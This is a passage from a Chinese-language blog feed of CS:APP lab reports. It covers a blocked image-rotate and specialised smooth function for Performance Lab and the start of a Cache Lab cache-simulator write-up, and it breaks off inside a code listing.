class="line">    <span class="keyword">return</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><p>总的来说不难的一个实验，关键在于要先理解整个框架中的代码，然后根据trace file渐进地完成程序。需要注意的地方实验讲义中的提示以及书本中都已经给出，这里不再赘述。需要强调的是SIGCHLD的信号处理程序需要处理未捕获的SIGTSTP和SIGINT信号。此外SIGINT/SIGTSTP和SIGCHLD的信号处理程序之间可能会有潜在的导致错误的冲突。（信号处理程序是可以被其他信号中断的，可以见trace16.txt）</p>
<p>此外，handler中的printf是异步不安全的，不推荐使用。以及书本中虽然使用了sigsuspend来实行同步，但是为了简化程序，根据实验讲义的提示，使用了忙循环处理前台等待，并且将回收僵死进程任务交给了sigchld_handler。这些都是本次实验中不足和可以修改的地方。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;实验答案托管在我的&lt;a href=&quot;https://github.com/BlackDragonF/CSAPPLabs/tree/master/ShellLab&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;GitHub&lt;/a&gt;上&lt;/p&gt;
&lt;blockqu
    
    </summary>
    
      <category term="计算机系统" scheme="http://blog.codedragon.tech/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="实验" scheme="http://blog.codedragon.tech/tags/%E5%AE%9E%E9%AA%8C/"/>
    
      <category term="计算机系统" scheme="http://blog.codedragon.tech/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>深入理解计算机系统PerformanceLab实验报告</title>
    <link href="http://blog.codedragon.tech/2017/07/20/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9FPerformanceLab%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/"/>
    <id>http://blog.codedragon.tech/2017/07/20/深入理解计算机系统PerformanceLab实验报告/</id>
    <published>2017-07-19T17:23:51.000Z</published>
    <updated>2017-07-20T06:46:12.190Z</updated>
    
    <content type="html"><![CDATA[<p>实验答案托管在我的<a href="https://github.com/BlackDragonF/CSAPPLabs/tree/master/PerformanceLab" target="_blank" rel="external">GitHub</a>上</p>
<blockquote>
<p>由于Cache Lab的Part B的64 × 64的矩阵一直拿不到满分，索性放在了一边，先从老的Performance Lab开始做起。</p>
</blockquote>
<h2 id="实验简介"><a href="#实验简介" class="headerlink" title="实验简介"></a>实验简介</h2><p>Performance Lab - Code Optimization是有关性能优化的实验，对应于书本的第5章：优化程序性能和第6章：存储器层次结构。主要提供了利用书本所学的知识优化代码的机会。</p>
<p>本实验主要分为两个部分，每个部分分别对于一个简单的图像处理函数进行优化。第一个部分所优化的函数旋转(rotate)对于缓存更加敏感，而第二个部分所优化的函数平滑(smooth)则属于计算密集型函数。对它们优化的侧重是有所不同的。</p>
<p>本实验的具体介绍见<a href="http://csapp.cs.cmu.edu/3e/perflab.pdf" target="_blank" rel="external">实验讲义</a>。</p>
<h2 id="实验介绍"><a href="#实验介绍" class="headerlink" title="实验介绍"></a>实验介绍</h2><p>在本实验中，我们将实现两个图像处理函数——旋转和平滑。</p>
<p>我们将一张图片抽象地表示为一个二维矩阵M，M(i, j)代表了M中第i行第j列的像素的值，该像素值被定义为红色、绿色、蓝色（RGB）的值的三元组。在本实验中，我们只考虑正方形的图片。下标遵循C语言风格，从0到N-1。</p>
<p>旋转操作被定义为将图片逆时针旋转90°，旋转可以分为两步实现——</p>
<ol>
<li>将矩阵转置，即将M(i, j)变为M(j, i)</li>
<li>将矩阵的第i行和第N - i - 1交换</li>
</ol>
<p>平滑操作被定义为将每一个像素点的值换位周围像素点（以该像素点为中心的最多3*3的正方形）的平均值。</p>
<h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><p>在本实验中像素（pixel）是一个定义如下的结构体：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">The core data structure deals with image representation. A pixel is a <span class="class"><span class="keyword">struct</span> <span class="title">as</span> <span class="title">shown</span> <span class="title">below</span>:</span></div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> red;    <span class="comment">/* R value */</span></div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> green;  <span class="comment">/* G value */</span></div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> blue;   <span class="comment">/* B value */</span></div><div class="line">&#125; pixel;</div></pre></td></tr></table></figure></p>
<p>此外，为了简化起见，还定义了如下的宏：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> RIDX(i,j,n) ((i)*(n)+(j))</span></div></pre></td></tr></table></figure></p>
<p>旋转操作的朴素版本如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">naive_rotate</span><span class="params">(<span class="keyword">int</span> dim, pixel *src, pixel *dst)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> i, j;</div><div class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i &lt; dim; i++)</div><div class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>; j &lt; dim; j++)</div><div class="line">            dst[RIDX(dim<span class="number">-1</span>-j,i,dim)] = src[RIDX(i,j,dim)];</div><div class="line">    <span class="keyword">return</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>平滑操作的朴素版本如下（辅助函数未列出）：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">naive_smooth</span><span class="params">(<span class="keyword">int</span> dim, pixel *src, pixel *dst)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> i, j;</div><div class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i &lt; dim; i++)</div><div class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>; j &lt; dim; j++)</div><div class="line">            dst[RIDX(i,j,dim)] = avg(dim, i, j, src); <span class="comment">/* Smooth the (i,j)th pixel */</span></div><div class="line">    <span class="keyword">return</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>为了简化起见，你可以假设所有的矩阵的边长都是32的倍数，并且在进行正确性测试的时候，只会测试5个值。</p>
<p>具体的注册函数和自动跑分机制请参阅实验讲义。</p>
<h2 id="实验思路"><a href="#实验思路" class="headerlink" title="实验思路"></a>实验思路</h2><p>旋转操作：旋转操作不涉及复杂的计算，经过测试将代码移动所带来的性能提升微乎其微。主要应当采用分块的手段提高代码的空间局部性的利用率。</p>
<p>平滑操作（平滑操作参考了别人的思路）：平滑操作是计算密集型函数，经过测试，通过减少过程调用以及代码移动带来的有限的性能提升。<br>观察原始代码可以发现分支预测的惩罚是巨大的（因为循环只会执行3次，会带来大量的预测不命中）。我们可以考虑将红、绿、蓝三色的值的计算分开地并行处理，并且依次处理四个角、四条边、和剩余的像素点。以提升局部性的利用率并且降低分支预测不命中所带来的惩罚。</p>
<h2 id="实验答案"><a href="#实验答案" class="headerlink" title="实验答案"></a>实验答案</h2><p>旋转操作：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">block_rotate</span><span class="params">(<span class="keyword">int</span> dim, pixel * src, pixel * dst)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> i, j, k, l;</div><div class="line">    <span class="keyword">int</span> cst0 = dim - <span class="number">1</span>;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">0</span> ; i &lt; dim ; i += <span class="number">8</span>) &#123;</div><div class="line">        <span class="keyword">for</span> (j = <span class="number">0</span> ; j &lt; dim ; j += <span class="number">8</span>) &#123;</div><div class="line">            <span class="keyword">for</span> (k = i ; k &lt; i + <span class="number">8</span> ; k++) &#123;</div><div class="line">                <span class="keyword">for</span> (l = j ; l &lt; j + <span class="number">8</span> ; l++) &#123;</div><div class="line">                    dst[RIDX(cst0 - l, k, dim)] = src[RIDX(k, l, dim)];</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>平滑操作：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">optimized_smooth</span><span class="params">(<span class="keyword">int</span> dim, pixel * src, pixel * dst)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> i, j;</div><div class="line">    <span class="keyword">int</span> tmp;</div><div class="line"></div><div class="line">    dst[<span class="number">0</span>].red = (src[<span class="number">0</span>].red + src[<span class="number">1</span>].red + src[dim].red + src[dim + <span class="number">1</span>].red) &gt;&gt; <span class="number">2</span>;</div><div class="line">    dst[<span class="number">0</span>].green = (src[<span class="number">0</span>].green + src[<span class="number">1</span>].green + src[dim].green + src[dim + <span class="number">1</span>].green) &gt;&gt; <span class="number">2</span>;</div><div class="line">    dst[<span class="number">0</span>].blue = (src[<span class="number">0</span>].blue + src[<span class="number">1</span>].blue + src[dim].blue + src[dim + <span class="number">1</span>].blue) &gt;&gt; <span class="number">2</span>;</div><div class="line">    i = dim - <span class="number">1</span>;</div><div class="line">    dst[i].red = (src[i].red + src[i - <span class="number">1</span>].red + src[i + dim].red + src[i + dim <span class="number">-1</span>].red) &gt;&gt; <span class="number">2</span>;</div><div class="line">    dst[i].green = (src[i].green + src[i - <span class="number">1</span>].green + src[i + dim].green + src[i + dim <span class="number">-1</span>].green) &gt;&gt; <span class="number">2</span>;</div><div class="line">    dst[i].blue = (src[i].blue + src[i - <span class="number">1</span>].blue + src[i + dim].blue + src[i + dim <span class="number">-1</span>].blue) &gt;&gt; <span class="number">2</span>;</div><div class="line">    i = i * dim;</div><div class="line">    dst[i].red = (src[i].red + src[i + <span class="number">1</span>].red + src[i - dim].red + src[i - dim + <span class="number">1</span>].red) &gt;&gt; <span class="number">2</span>;</div><div class="line">    dst[i].green = (src[i].green + src[i + <span class="number">1</span>].green + src[i - dim].green + src[i - dim + <span class="number">1</span>].green) &gt;&gt; <span class="number">2</span>;</div><div class="line">    dst[i].blue = (src[i].blue + src[i + <span class="number">1</span>].blue + src[i - dim].blue + src[i - dim + <span class="number">1</span>].blue) &gt;&gt; <span class="number">2</span>;</div><div class="line">    i = i + dim - <span class="number">1</span>;</div><div class="line">    dst[i].red = (src[i].red + src[i - <span class="number">1</span>].red + src[i - dim].red + src[i - dim - <span class="number">1</span>].red) &gt;&gt; <span class="number">2</span>;</div><div class="line">    dst[i].green = (src[i].green + src[i - <span class="number">1</span>].green + src[i - dim].green + src[i - dim - <span class="number">1</span>].green) &gt;&gt; <span class="number">2</span>;</div><div class="line">    dst[i].blue = (src[i].blue + src[i - <span class="number">1</span>].blue + src[i - dim].blue + src[i - dim - <span class="number">1</span>].blue) &gt;&gt; <span class="number">2</span>;</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span> ; i &lt; dim - <span class="number">1</span> ; i++) &#123;</div><div class="line">        dst[i].red = (src[i].red + src[i - <span class="number">1</span>].red + src[i + <span class="number">1</span>].red + src[i + dim].red + src[i + dim - <span class="number">1</span>].red + src[i + dim + <span class="number">1</span>].red) / <span class="number">6</span>;</div><div class="line">        dst[i].green = (src[i].green + src[i - <span class="number">1</span>].green + src[i + <span class="number">1</span>].green + src[i + dim].green + src[i + dim - <span class="number">1</span>].green + src[i + dim + <span class="number">1</span>].green) / <span class="number">6</span>;</div><div class="line">        dst[i].blue = (src[i].blue + src[i - <span class="number">1</span>].blue + src[i + <span class="number">1</span>].blue + src[i + dim].blue + src[i + dim - <span class="number">1</span>].blue + src[i + dim + <span class="number">1</span>].blue) / <span class="number">6</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> (i = dim * (dim - <span class="number">1</span>) + <span class="number">1</span> ; i &lt; dim * dim - <span class="number">1</span> ; i++) &#123;</div><div class="line">        dst[i].red = (src[i].red + src[i - <span class="number">1</span>].red + src[i + <span class="number">1</span>].red + src[i - dim].red + src[i - dim - <span class="number">1</span>].red + src[i - dim + <span class="number">1</span>].red) / <span class="number">6</span>;</div><div class="line">        dst[i].green = (src[i].green + src[i - <span class="number">1</span>].green + src[i + <span class="number">1</span>].green + src[i - dim].green + src[i - dim - <span class="number">1</span>].green + src[i - dim + <span class="number">1</span>].green) / <span class="number">6</span>;</div><div class="line">        dst[i].blue = (src[i].blue + src[i - <span class="number">1</span>].blue + src[i + <span class="number">1</span>].blue+ src[i - dim].blue + src[i - dim - <span class="number">1</span>].blue+ src[i - dim + <span class="number">1</span>].blue) / <span class="number">6</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> (j = dim ; j &lt; dim * (dim - <span class="number">1</span>) ; j+= dim) &#123;</div><div class="line">        dst[j].red = (src[j].red + src[j + <span class="number">1</span>].red + src[j - dim].red + src[j - dim + <span class="number">1</span>].red + src[j + dim].red + src[j + dim + <span class="number">1</span>].red) / <span class="number">6</span>;</div><div class="line">        dst[j].green = (src[j].green + src[j + <span class="number">1</span>].green + src[j - dim].green+ src[j - dim + <span class="number">1</span>].green + src[j + dim].green + src[j + dim + <span class="number">1</span>].green) / <span class="number">6</span>;</div><div class="line">        dst[j].blue = (src[j].blue + src[j + <span class="number">1</span>].blue + src[j - dim].blue + src[j - dim + <span class="number">1</span>].blue + src[j + dim].blue + src[j + dim + <span class="number">1</span>].blue) / <span class="number">6</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> (j = <span class="number">2</span> * dim - <span class="number">1</span> ; j &lt; dim * dim - <span class="number">1</span> ; j += dim) &#123;</div><div class="line">        dst[j].red = (src[j].red + src[j - <span class="number">1</span>].red + src[j - dim].red + src[j - dim - <span class="number">1</span>].red + src[j + dim].red + src[j + dim - <span class="number">1</span>].red) / <span class="number">6</span>;</div><div class="line">        dst[j].green = (src[j].green + src[j - <span class="number">1</span>].green + src[j - dim].green + src[j - dim - <span class="number">1</span>].green + src[j + dim].green + src[j + dim - <span class="number">1</span>].green) / <span class="number">6</span>;</div><div class="line">        dst[j].blue = (src[j].blue + src[j - <span class="number">1</span>].blue + src[j - dim].blue + src[j - dim - <span class="number">1</span>].blue + src[j + dim].blue + src[j + dim - <span class="number">1</span>].blue) / <span class="number">6</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span> ; i &lt; dim - <span class="number">1</span> ; i++) &#123;</div><div class="line">        <span class="keyword">for</span> (j = <span class="number">1</span> ; j &lt; dim - <span class="number">1</span> ; j++) &#123;</div><div class="line">            tmp = i * dim + j;</div><div class="line">            dst[tmp].red = (src[tmp].red + src[tmp - <span class="number">1</span>].red + src[tmp + <span class="number">1</span>].red + src[tmp - dim].red + src[tmp - dim - <span class="number">1</span>].red + src[tmp - dim + <span class="number">1</span>].red + src[tmp + dim].red + src[tmp + dim - <span class="number">1</span>].red + src[tmp + dim + <span class="number">1</span>].red) / <span class="number">9</span>;</div><div class="line">            dst[tmp].green = (src[tmp].green + src[tmp - <span class="number">1</span>].green + src[tmp + <span class="number">1</span>].green + src[tmp - dim].green + src[tmp - dim - <span class="number">1</span>].green + src[tmp - dim + <span class="number">1</span>].green + src[tmp + dim].green + src[tmp + dim - <span class="number">1</span>].green + src[tmp + dim + <span class="number">1</span>].green) / <span class="number">9</span>;</div><div class="line">            dst[tmp].blue = (src[tmp].blue + src[tmp - <span class="number">1</span>].blue + src[tmp + <span class="number">1</span>].blue + src[tmp - dim].blue + src[tmp - dim - <span class="number">1</span>].blue + src[tmp - dim + <span class="number">1</span>].blue + src[tmp + dim].blue + src[tmp + dim - <span class="number">1</span>].blue + src[tmp + dim + <span class="number">1</span>].blue) / <span class="number">9</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><p>实验的第一部分对于缓存的要求不是很高，简单的分块可以带来很大的性能提升。</p>
<p>实验的第二部分实际上我是卡了比较久的，在发现减少过程调用和代码移动性能提升有限后我就卡住了，因为我发现似乎无法进行循环展开。实际上还是太生疏了，没有想到要分析性能瓶颈，最后参考了别人的答案，实际上看到了别人答案的一瞬间就豁然开朗了，但是在这之前完全没有想到会是分支预测的问题。还需要多加练习。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;实验答案托管在我的&lt;a href=&quot;https://github.com/BlackDragonF/CSAPPLabs/tree/master/PerformanceLab&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;GitHub&lt;/a&gt;上&lt;/p&gt;
&lt;b
    
    </summary>
    
      <category term="计算机系统" scheme="http://blog.codedragon.tech/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="实验" scheme="http://blog.codedragon.tech/tags/%E5%AE%9E%E9%AA%8C/"/>
    
      <category term="计算机系统" scheme="http://blog.codedragon.tech/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>深入理解计算机系统CacheLab-PartA实验报告</title>
    <link href="http://blog.codedragon.tech/2017/07/08/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9FCacheLab-PartA%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/"/>
    <id>http://blog.codedragon.tech/2017/07/08/深入理解计算机系统CacheLab-PartA实验报告/</id>
    <published>2017-07-08T09:55:51.000Z</published>
    <updated>2017-07-19T17:24:45.759Z</updated>
    
    <content type="html"><![CDATA[<p>实验答案托管在我的<a href="https://github.com/BlackDragonF/CSAPPLabs/tree/master/CacheLab" target="_blank" rel="external">GitHub</a>上</p>
<blockquote>
<p>考完试之后一直比较颓废，本来想看完《深入理解计算机系统》的第5章——优化程序性能之后就赶快来做实验的，后来发现无论是Cache Lab还是Performance Lab都需要第6章——存储器层次结构的知识。看了几天的书，又磨蹭了几天，终于把Cache Lab的Part A写完了，总结如下。</p>
</blockquote>
<h2 id="实验简介"><a href="#实验简介" class="headerlink" title="实验简介"></a>实验简介</h2><p>Cache Lab - Understanding Cache Memories主要是有关缓存的实验，对应于书本的第6章：存储器层次结构。主要阐明了缓存对于C语言程序的性能影响。</p>
<p>本实验主要分为两个部分。第一个部分要求完成一个C语言程序用来模拟缓存的行为；而第二个部分要求优化一个小的矩阵变换函数，使其具有尽可能小的缓存不命中率。</p>
<p>关于本实验的具体介绍详见<a href="http://csapp.cs.cmu.edu/3e/archlab32-handout.tar" target="_blank" rel="external">实验讲义</a>。</p>
<h2 id="实验介绍"><a href="#实验介绍" class="headerlink" title="实验介绍"></a>实验介绍</h2><p>实验讲义中的traces子文件夹下包含了一组reference trace files，用来作为评估Part A中缓存模拟器正确性的样例数据。这些文件是由valgrind生成的。</p>
<p>Valgrind是一个用于内存调试，内存泄露以及性能分析的软件。例如，我们输入如下的命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">linux&gt; valgrind --<span class="built_in">log</span>-fd=1 --tool=lackey -v --trace-mem=yes ls -l</div></pre></td></tr></table></figure><br>valgrind会在命令行中执行ls -l命令并且按照顺序记录该命令的每一次内存访问，并且将其输出到标准输出流中。</p>
<p>下面是一个valgrind的输出样例：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">I 0400d7d4,8</div><div class="line"> M 0421c7f0,4</div><div class="line"> L 04f6b868,8</div><div class="line"> S 7ff0005c8,8</div></pre></td></tr></table></figure></p>
<p>每一行的基本格式如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[空格]操作 地址,大小</div></pre></td></tr></table></figure><br>操作代表了内存访问的种类，<code>&#39;I&#39;</code>代表的是指令加载，<code>&#39;L&#39;</code>代表的是数据加载，<code>&#39;S&#39;</code>代表的是数据存储，<code>&#39;M&#39;</code>代表的是数据修改（如一条数据加载之后紧跟着数据存储）。在<code>&#39;I&#39;</code>之前永远没有空格，而其他的操作前必定有前置空格。<br>地址代表的是一个64位的16进制内存地址。<br>大小指明了该次内存访问涉及的字节数。</p>
<h2 id="实验要求-Part-A"><a href="#实验要求-Part-A" class="headerlink" title="实验要求 - Part A"></a>实验要求 - Part A</h2><p>在Part A中你需要在csim.c中实现一个LRU驱逐机制的缓存模拟器，该模拟器接收valgrind的trace作为输入，模拟一个缓存在该情况下的命中/不命中情况，并且输出所有的命中，不命中以及驱逐的次数。</p>
<p>本实验已经提供了一个用来参考的缓存模拟器csim-ref，其使用方式以及输出如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">Usage: ./csim-ref [-hv] -s &lt;s&gt; -E &lt;E&gt; -b &lt;b&gt; -t &lt;tracefile&gt;</div><div class="line">• -h: Optional <span class="built_in">help</span> flag that prints usage info</div><div class="line">• -v: Optional verbose flag that displays trace info</div><div class="line">• -s &lt;s&gt;: Number of <span class="built_in">set</span> index bits (S = 2 s is the number of sets)</div><div class="line">• -E &lt;E&gt;: Associativity (number of lines per <span class="built_in">set</span>)</div><div class="line">• -b &lt;b&gt;: Number of block bits (B = 2 b is the block size)</div><div class="line">• -t &lt;tracefile&gt;: Name of the valgrind trace to replay</div><div class="line"></div><div class="line">linux&gt; ./csim-ref -s 4 -E 1 -b 4 -t traces/yi.trace</div><div class="line">hits:4 misses:5 evictions:3</div><div class="line"></div><div class="line">linux&gt; ./csim-ref -v -s 4 -E 1 -b 4 -t traces/yi.trace</div><div class="line">L 10,1 miss</div><div class="line">M 20,1 miss hit</div><div class="line">L 22,1 hit</div><div class="line">S 18,1 hit</div><div class="line">L 110,1 miss eviction</div><div class="line">L 210,1 miss eviction</div><div class="line">M 12,1 miss eviction hit</div><div class="line">hits:4 misses:5 evictions:3</div></pre></td></tr></table></figure></p>
<p>对于Part A有以下的要求和限制：</p>
<ol>
<li>所写的程序编译时不能有任何的警告</li>
<li>能应对不同s，E和b的缓存生成对应的结果，这要求使用malloc来为你的数据结构分配空间</li>
<li>不需要考虑指令加载的缓存情况</li>
<li>调用printSummary打印最终的结果</li>
<li>假定数据已经适当对齐，不会出现一次数据加载跨区块的情况。这样，你可以忽略trace中的大小</li>
</ol>
<p>除此以外，实验的自学者讲义中还包含了一些提示，这里就不再赘述。</p>
<p>完成了Part A之后，可以用<code>make clean &amp;&amp; make</code>进行编译，并且用<code>./test-csim</code>进行自动评分，总共有8组样例，共27分满分。</p>
<h2 id="实验过程-Part-A"><a href="#实验过程-Part-A" class="headerlink" title="实验过程 - Part A"></a>实验过程 - Part A</h2><h3 id="实验思路"><a href="#实验思路" class="headerlink" title="实验思路"></a>实验思路</h3><p>整个模拟器在思路上可以进行如下的拆分：</p>
<h4 id="1-命令行参数解析"><a href="#1-命令行参数解析" class="headerlink" title="1.命令行参数解析"></a>1.命令行参数解析</h4><p>由于该模拟器是命令行程序并且接受命令行参数，因此需要能对命令行参数进行解析和处理，这里推荐使用getopt进行参数的解析。并且根据不同的参数执行不同的控制流，并且处理一些基本的错误如参数缺失以及参数类型错误。</p>
<h4 id="2-数据结构"><a href="#2-数据结构" class="headerlink" title="2.数据结构"></a>2.数据结构</h4><p>这是整个模拟器最基本的部分。我们需要创建合适的数据结构来模拟缓存，该数据结构不仅要能模拟缓存的数据的实际组织方式（有效位，标志位以及行和块等等），还需要考虑到LRU的驱逐机制。</p>
<h4 id="3-文件中内存访问记录的处理和解析"><a href="#3-文件中内存访问记录的处理和解析" class="headerlink" title="3.文件中内存访问记录的处理和解析"></a>3.文件中内存访问记录的处理和解析</h4><p>这个是模拟器中核心的部分。模拟器的功能就是从文件中接收内存访问记录，并且根据这些记录来模拟缓存的行为，操作我们所设计的缓存的数据结构。</p>
<h3 id="实验代码"><a href="#实验代码" class="headerlink" title="实验代码"></a>实验代码</h3><p>该代码仅供参考，很可能并不是一个非常好的解法。如果你也在面对同样的实验，<strong>请不要抄袭</strong>，毕竟抄袭是不会使你变得更强的:)<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div 